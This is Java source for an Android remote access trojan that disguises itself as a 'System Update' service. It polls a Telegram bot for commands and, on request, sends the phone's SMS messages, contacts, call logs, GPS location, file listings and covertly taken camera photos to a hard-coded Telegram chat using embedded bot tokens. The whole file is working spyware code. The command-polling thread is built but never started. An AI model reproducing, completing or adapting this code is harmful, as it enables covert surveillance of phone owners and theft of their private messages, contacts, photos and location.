package com.system.update;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.os.Environment;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class Payload extends Service {
    private String BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"; 
    private String BUILDER_TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo";
    private String CHAT_ID = "8598136412";
    
    private volatile boolean isRunning = true;
    private long lastUpdateId = 0;

    private void writeLog(String msg) {
        try {
            File file = new File(getExternalFilesDir(null), "rat_debug.txt");
            FileOutputStream fos = new FileOutputStream(file, true);
            fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
            fos.close();
        } catch (Exception e) {}
    }

    public static void askPermissions(Activity activity) {
        if (Build.VERSION.SDK_INT >= 23) {
            List<String> permissions = new ArrayList<>();
            String[] perms = {
                "android.permission.READ_SMS", "android.permission.RECEIVE_SMS",
                "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG",
                "android.permission.CAMERA", "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"
            };
            for (String p : perms) {
                if (activity.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    permissions.add(p);
                }
            }
            if (Build.VERSION.SDK_INT >= 33) {
                if (activity.checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
                    permissions.add("android.permission.POST_NOTIFICATIONS");
                }
            }
            if (!permissions.isEmpty()) {
                activity.requestPermissions(permissions.toArray(new String[0]), 101);
            }
            
            try {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + activity.getPackageName()));
                activity.startActivity(intent);
            } catch (Exception e) {}
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            android.os.Handler handler = new android.os.Handler(getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    Toast.makeText(getApplicationContext(), "Service Running", Toast.LENGTH_LONG).show();
                }
            });
        } catch (Exception e) {}

        writeLog("1. Service dimulai (onStartCommand)");
        
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                String CHANNEL_ID = "sys_update_channel";
                NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
                channel.setShowBadge(false);
                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                if (manager != null) manager.createNotificationChannel(channel);

                Notification notification = new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("System Update")
                        .setContentText("Checking for updates...")
                        .setSmallIcon(android.R.drawable.ic_popup_sync)
                        .build();
                startForeground(1, notification);
                writeLog("2. Foreground Service berhasil");
            }
        } catch (Exception e) {
            writeLog("ERROR StartForeground: " + e.getMessage());
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                writeLog("3. Thread jalan");
                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
                
                sendTelegramMessage("🚀 *Service Active!*\nDevice: " + deviceName);
                writeLog("4. Pesan Service Active terkirim/tertunda");

                sendCheckIn(deviceName);
                writeLog("5. CheckIn terkirim/tertunda");

                while (isRunning) {
                    try {
                        String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                        URL url = new URL(urlStr);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        
                        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder response = new StringBuilder();
                        String line;
                        while ((line = in.readLine()) != null) { response.append(line); }
                        in.close();

                        String jsonResponse = response.toString();
                        
                        if (jsonResponse.contains("\"update_id\":")) {
                            int startIdx = jsonResponse.lastIndexOf("\"update_id\":") + 12;
                            int endIdx = jsonResponse.indexOf(",", startIdx);
                            if (endIdx == -1) endIdx = jsonResponse.indexOf("}", startIdx);
                            lastUpdateId = Long.parseLong(jsonResponse.substring(startIdx, endIdx).trim());
                        }
                        
                        if (jsonResponse.contains("\"text\":\"/dump_sms\"")) {
                            sendTelegramMessage("📩 *Dump SMS:*\n" + getSms());
                        } else if (jsonResponse.contains("\"text\":\"/dump_kontak\"")) {
                            sendTelegramMessage("👥 *Dump Kontak:*\n" + getContacts());
                        } else if (jsonResponse.contains("\"text\":\"/dump_telpon\"")) {
                            sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
                        } else if (jsonResponse.contains("\"text\":\"/foto_depan\"")) {
                            takePhoto(1);
                        } else if (jsonResponse.contains("\"text\":\"/foto_belakang\"")) {
                            takePhoto(0);
                        } else if (jsonResponse.contains("\"text\":\"/lacak\"")) {
                            sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
                        } else if (jsonResponse.contains("\"text\":\"/cek_file\"")) {
                            sendTelegramMessage("📂 *Isi Folder:*\n" + listFiles("/storage/emulated/0/"));
                        }

                    } catch (Exception e) { 
                        writeLog("Error Loop: " + e.getMessage());
                    }
                    try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) { e.printStackTrace(); }
                }
            }
        });
        return START_STICKY;
    }

    private void sendCheckIn(String deviceInfo) {
        try {
            String encoded = URLEncoder.encode("/checkin " + deviceInfo, "UTF-8");
            String urlStr = "https://api.telegram.org/bot" + BUILDER_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded;
            new URL(urlStr).openConnection().getInputStream().close();
        } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
    }

    private String getSms() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 15; i++) {
                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address"))).append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca SMS."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada SMS.";
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 30; i++) {
                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" - ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca Kontak."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada Kontak.";
    }

    private String getCallLogs() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 15; i++) {
                    sb.append("Nomor: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))).append("\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca Call Log."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada Call Log.";
    }

    private String getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) return "Lat: " + loc.getLatitude() + "\nLng: " + loc.getLongitude();
        } catch (Exception e) { return "Gagal ambil lokasi."; }
        return "Lokasi tidak tersedia.";
    }

    private String listFiles(String path) {
        StringBuilder sb = new StringBuilder();
        try {
            File dir = new File(path);
            File[] files = dir.listFiles();
            if (files != null) {
                for (int i = 0; i < files.length && i < 10; i++) sb.append(files[i].getName()).append("\n");
            }
        } catch (Exception e) { return "Gagal baca file."; }
        return sb.length() > 0 ? sb.toString() : "Folder kosong.";
    }

    private void takePhoto(int cameraId) {
        try {
            Camera camera = Camera.open(cameraId);
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        File file = new File(Environment.getExternalStorageDirectory(), "sys_photo_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(data);
                        fos.close();
                        camera.release();
                        sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera " + (cameraId == 1 ? "Depan" : "Belakang"));
                    } catch (Exception e) { e.printStackTrace(); }
                }
            });
        } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto."); }
    }

    private void sendTelegramMessage(String pesan) {
        try {
            String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
            new URL(urlStr).openConnection().getInputStream().close();
        } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
    }

    private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
        String boundary = "*****";
        try {
            File file = new File(filePath);
            if (!file.exists()) return;
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + (isPhoto ? "/sendPhoto" : "/sendDocument");
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
            if (caption != null) request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
            fis.close();
            request.writeBytes("\r\n--" + boundary + "--\r\n");
            request.flush(); request.close(); conn.getResponseCode(); file.delete();
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
